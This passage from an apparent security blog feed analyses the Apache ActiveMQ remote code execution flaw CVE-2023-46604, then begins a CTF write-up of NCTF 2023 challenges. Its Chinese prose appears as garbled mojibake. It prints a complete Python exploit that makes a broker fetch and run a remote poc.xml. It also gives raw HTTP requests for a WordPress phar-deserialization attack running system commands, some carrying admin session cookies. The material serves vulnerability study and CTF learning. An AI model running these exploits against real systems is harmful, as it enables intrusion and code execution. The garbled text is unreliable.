class="name">value</span>&gt;</span>/tmp/activeMQ-RCE-success<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rce.png" class><h3 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p>å…ˆä» Server è¿™è¾¹è°ƒè¯•èµ·</p><p>çœ‹è°ƒç”¨æ ˆæ˜¯å¾ˆæ¸…æ™°çš„ï¼Œä¼šè°ƒåˆ° <code>TcpTransport#oneway</code> æ–¹æ³•</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/debugoneWay.png" class><p>éšåæ ¹æ® classpath ä¼˜å…ˆçº§ï¼Œä¼šä¼˜å…ˆè°ƒç”¨æˆ‘ä»¬è‡ªå·± patch çš„ <code>TcpTransport#oneway</code> æ–¹æ³•ï¼Œé‡Œé¢å®šä¹‰äº†ä¸€ä¸ª ExceptionResponse ç±»ï¼Œå¹¶å°†å…¶åºåˆ—åŒ–</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/marshall.png" class><p>æ¥ä¸‹æ¥å°±æ˜¯ Server éƒ¨åˆ†çš„å¤„ç†äº†</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/doUnmarshalFirst.png" class><p>è·Ÿè¿›å¾€ä¸‹èµ°ï¼Œå‘ç°æ­¤å¤„çš„ dataType è¢«è®¾ç½®æˆ 31 äº†ï¼Œå¯¹åº”çš„ç±»ä¹Ÿæ˜¯ ExceptionResponse</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setDataType31.png" class><p>æ ¹æ®å‰é¢åˆ†æçš„é€»è¾‘ï¼Œæ¥åˆ° <code>org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable</code></p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/createThrowable.png" class><p>æˆåŠŸ RCEï¼Œæµç¨‹å¾ˆæ¸…æ™°æ˜æœ—</p><h3 id="åè®®åˆ†æ"><a href="#åè®®åˆ†æ" class="headerlink" title="åè®®åˆ†æ"></a>åè®®åˆ†æ</h3><p>ä¸‹é¢è¦åšä¸€ä¸‹åè®®åˆ†æçš„éƒ¨åˆ†ï¼Œå› ä¸ºè¿™é‡Œæ˜ç¡®è¯´æ˜¯ openwire åè®®äº†ï¼Œwireshark æŠ“åŒ…</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/openwireWireshark.png" class><p>ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æ¯”è¾ƒåƒä¸€ä¸ª Hello çš„æ•°æ®åŒ…ï¼Œçœ‹ä¸Šå»æ˜¯å¿…è¦çš„ï¼ˆä¸ç¡®å®šï¼‰ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…æ˜¯å‘åŒ…çš„æ•°æ®åŒ…ï¼Œç¬¬ä¸‰ä¸ªæ•°æ®åŒ…åˆ™æ˜¯ååºåˆ—åŒ–çš„æ•°æ®åŒ…å›æ˜¾ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ä¸ç¬¬äºŒä¸ªå³å¯ã€‚</p><p>è¿™é‡Œæˆ‘æƒ³çš„æ˜¯å…ˆæ„é€ ç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œå¦‚æœç›´æ¥ç¬¬äºŒä¸ªæ•°æ®åŒ…å‘åŒ…å°±å¯ä»¥ï¼Œå°±æ²¡æœ‰å¿…é¡»è¦åŠ ç¬¬ä¸€ä¸ªåŒ…äº†ã€‚</p><p>æ“å‡ºæ¥çš„ Demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip, port, poc</span>):</span><br><span class="line">    classname = <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span></span><br><span class="line">    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socket_obj.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    new_len = <span class="built_in">len</span>(classname + poc)</span><br><span class="line">    package_data_len = <span class="built_in">ascii</span>(new_len + <span class="number">17</span>)</span><br><span class="line">    Command = <span class="string">&quot;1f&quot;</span>  <span class="comment"># Command: ExceptionResponse(31)</span></span><br><span class="line">    Command_Id = <span class="string">&quot;00000000&quot;</span>  <span class="comment"># Command Id: 00 00 00 00</span></span><br><span class="line">    Command_response_required = <span class="string">&quot;00&quot;</span> <span class="comment"># Command response required: 0</span></span><br><span class="line">    CorrelationId = <span class="string">&quot;00000000&quot;</span> <span class="comment"># CorrelationId: 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket_obj:</span><br><span class="line">        out = socket_obj.makefile(<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        out.write(<span class="built_in">int</span>(package_data_len).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bytes</span>([<span class="number">31</span>]))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">0</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">1</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(classname).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(classname.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(poc).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(poc.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(list(out.getvalue()))</span></span><br><span class="line">        out.flush()</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please specify the target and port and poc.xml: python3 exp.py 127.0.0.1 61616 &quot;</span></span><br><span class="line">              <span class="string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]), sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>å‘åŒ…ï¼Œæ‰“ä¸é€šï¼Œæ˜æ˜¾æ˜¯ä¸å¯¹çš„ï¼Œæ‰äº†è¿™ä¸‰ä¸ªæ•°æ®åŒ…</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/losePack.png" class><p>åœ¨ä»»ä½•ä¸€ä¸ªåŒ…é‡Œé¢ï¼Œè¿™ä¸¤æ®µéƒ½æ˜¯ç›¸åŒçš„ï¼Œç›´æ¥ç¡¬ç¼–ç è‚¯å®šä¸å¤ªè¡Œï¼Œéœ€è¦åŠ¨è°ƒçœ‹ä¸€ä¸‹ç‰¹æ®Šå«ä¹‰ã€‚</p><p>å‰é¢ä¸¤ä¸ª 01 ä»£è¡¨çš„æ˜¯ trueï¼Œä¸º dataIn.readBoolen()</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/onetrue.png" class><p>ç›®å‰è°ƒæ•´äº†ä¹‹åå°±å¯ä»¥äº†ï¼Œä½†æ˜¯å‘ç°æ²¡åŠæ³•è¯»å–æ¶æ„ poc.xml</p><p>æ€€ç–‘æ˜¯ç¬¬äºŒä¸ªéƒ¨åˆ†ç¼ºå¤±çš„é—®é¢˜ï¼Œæ€€ç–‘æ˜¯åºåˆ—åŒ–çš„æ•°æ®æœ‰é—®é¢˜ï¼Œåé¢å‘ç°æ˜¯ Throwable çš„é—®é¢˜</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/pro2.png" class><p>åŒæ ·éœ€è¦ set ä¸º trueï¼Œå®Œæ•´ EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip, port, poc</span>):</span><br><span class="line">    classname = <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span></span><br><span class="line">    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socket_obj.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    new_len = <span class="built_in">len</span>(classname + poc)</span><br><span class="line">    package_data_len = <span class="built_in">ascii</span>(new_len + <span class="number">17</span>)</span><br><span class="line">    Command = <span class="string">&quot;1f&quot;</span>  <span class="comment"># Command: ExceptionResponse(31)</span></span><br><span class="line">    Command_Id = <span class="string">&quot;00000000&quot;</span>  <span class="comment"># Command Id: 00 00 00 00</span></span><br><span class="line">    Command_response_required = <span class="string">&quot;00&quot;</span> <span class="comment"># Command response required: 0</span></span><br><span class="line">    CorrelationId = <span class="string">&quot;00000000&quot;</span> <span class="comment"># CorrelationId: 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket_obj:</span><br><span class="line">        out = socket_obj.makefile(<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        out.write(<span class="built_in">int</span>(package_data_len).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bytes</span>([<span class="number">31</span>]))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">0</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">0</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(classname).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(classname.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(poc).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(poc.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(list(out.getvalue()))</span></span><br><span class="line">        out.flush()</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please specify the target and port and poc.xml: python3 exp.py 127.0.0.1 61616 &quot;</span></span><br><span class="line">              <span class="string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]), sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h2 id="0x05-æ¼æ´ä¿®å¤"><a href="#0x05-æ¼æ´ä¿®å¤" class="headerlink" title="0x05 æ¼æ´ä¿®å¤"></a>0x05 æ¼æ´ä¿®å¤</h2><p>å…¶å®å°±æ˜¯å‰é¢çš„ patch</p><h2 id="0x06-å°ç»“"><a href="#0x06-å°ç»“" class="headerlink" title="0x06 å°ç»“"></a>0x06 å°ç»“</h2><p>ç¡®å®æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„æ´ï¼Œå­¦åˆ°äº† patch çš„æ‰‹æ³•ï¼Œå¾ˆæœ‰æ„æ€</p><p>æœ€åçš„é€šè¿‡åˆ†æåè®®æ¥ç¼–å†™ EXP ä¹ŸæŒºå¥½ç©çš„ã€‚</p><h2 id="0x07-Ref"><a href="#0x07-Ref" class="headerlink" title="0x07 Ref"></a>0x07 Ref</h2><p>X1r0z tqlllllllllll</p><p><a class="link" href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-46604 æ¼æ´åˆ†æ</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2023 NCTF WP</title>
    <link href="https://drun1baby.github.io/2023/12/27/2023-NCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/12/27/2023-NCTF-WP/</id>
    <published>2023-12-27T08:08:39.000Z</published>
    <updated>2023-12-27T08:10:35.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023-NCTF-WP"><a href="#2023-NCTF-WP" class="headerlink" title="2023 NCTF WP"></a>2023 NCTF WP</h1><h2 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h2><p>log4j2</p><p>å’ŒåŸæœ¬çš„åŒºåˆ«æ˜¯æ²¡æœ‰ Logger ä¸€ç³»åˆ— apiã€‚ä½†æ˜¯ç”¨ Accept å¤´ä¿®æ”¹å°±å¯ä»¥</p><img src="/2023/12/27/2023-NCTF-WP/log4j.png" class><p>åå¼¹ shell æ‹¿ flag</p><img src="/2023/12/27/2023-NCTF-WP/flag1.png" class><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>å¾ˆ realworld çš„ä¸€é“é¢˜ç›®ï¼Œå‡ºçš„æŒºå¥½çš„ï¼Œå°±æ˜¯ä¸€å¼€å§‹çš„æ€è·¯æ²¡æƒ³åˆ°ã€‚ç„¶åè¸©äº†å¾ˆå¤šå‘ã€‚</p><p>å…ˆç”¨ wpscan æ‰«ï¼Œåšä¿¡æ¯æ”¶é›†ã€‚</p><ul><li>Wordpress ç‰ˆæœ¬æ˜¯ 6.4.1 æœ‰ POP é“¾æ¼æ´ã€‚</li><li>all-in-one-video-gallery æ’ä»¶ç‰ˆæœ¬æ˜¯ 2.6.4ï¼Œæœ‰ä»»æ„æ–‡ä»¶è¯»å– &amp; SSRF çš„æ´ã€‚</li><li>contact-form-7 è¿™é‡Œæä¾›äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ã€‚Version: 5.8.4</li><li>drag-and-drop-multiple-file-upload-contact-form-7ï¼ŒVersionï¼š1.3.6.2ï¼›ä¹Ÿæ˜¯æ–‡ä»¶ä¸Šä¼ çš„ç‚¹ã€‚</li></ul><p>è¿™é‡Œçš„æ€è·¯æ˜¯å¾ˆç‰¹åˆ«çš„ï¼Œphar + SSRFï¼Œæ‰€ä»¥è¯´è¿™ä¸ªé¢˜ç›®çœŸçš„å¾ˆ RealWorld</p><p>é€šè¿‡ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª phar æ–‡ä»¶ï¼Œç”±äº phar åè®®å¯¹äºåç¼€æ˜¯æ— æ‰€è°“çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸Šä¼  jpg å°±å¯ä»¥äº†ã€‚</p><p>ä½†æ˜¯è¦æ„é€ è¿™ä¸ª HTTP è¯·æ±‚éœ€è¦è‡ªå·±èµ·ä¸€ä¸ªç¯å¢ƒï¼Œç„¶åé…ç½® drag-and-drop-multiple-file-upload-contact-form-7 æ’ä»¶çš„æ–‡ä»¶ä¸Šä¼ ã€‚è¿™ä¸ªæ’ä»¶æœ€åæ˜¯åœ¨æ–‡ç« è¯„è®ºé‡Œé¢èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œå‡ºé¢˜äººæŠŠ CSS éƒ½åˆ æ‰äº†ï¼Œ å¯¼è‡´åªèƒ½è‡ªå·±èµ·ç¯å¢ƒã€‚</p><p>æœ€ç»ˆçš„æ–‡ä»¶ä¸Šä¼ çš„ HTTP åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.27.148.152:8012</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1100</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary4iNAMw9WsXYpvRh5</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.155.130:8080</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.155.130:8080/2023/12/23/hello-world/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_ac537363824161b6f57971b554f35150=admin%7C1703488989%7CPIzRFsjUUfT48tJQYugEtBeOXowW4dq5DGTK0htmzgp%7C1613ac86565afa28de016afa707f293446d531968efbbfe134f2c39f9116fd8c; wordpress_37b73f3997d8e86a5444f5e6169e62a9=admin%7C1703507590%7CphGpVzdrXMbZ1trfyuedAn43lTl3bm6e98CkwVCGBGU%7C84448144083da56f705baf56db136311c0121a1ac9f0f942cee38c9407ebd8f5; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ac537363824161b6f57971b554f35150=admin%7C1703488989%7CPIzRFsjUUfT48tJQYugEtBeOXowW4dq5DGTK0htmzgp%7C8bbeecd37213bac95528f20b5a6714b63984d4caf8c83e032c3e2d3e6e08c931; aiovg_rand_seed=4191310244; wp_lang=zh_CN; wordpress_logged_in_37b73f3997d8e86a5444f5e6169e62a9=admin%7C1703507590%7CphGpVzdrXMbZ1trfyuedAn43lTl3bm6e98CkwVCGBGU%7C8d30bb0f69143395c98c0e2fde270c1236a715c34584cc2ab3755c7fc3bdf982; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1703334790</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;size_limit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">15555555555</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;action&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">dnd_codedropz_upload</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;type&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">click</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;security&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">a803333984</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;form_id&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">18</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_name&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">upload-file<span class="number">-393</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload-file&quot;; filename=&quot;drunkbaby1.png&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">test</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>ç”¨Â pharÂ ä¼ªåè®®å»æ„é€ ååºåˆ—åŒ–çš„Â HTTPÂ è¯·æ±‚å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/video?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL2RydW5rYmFieTEucG5n&amp;a=system&amp;c=ls</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.27.148.152:8012</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>aiovg_rand_seed=1541956646</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€  phar çš„ EXP</p><figure class="highlight php"><table><tr><td 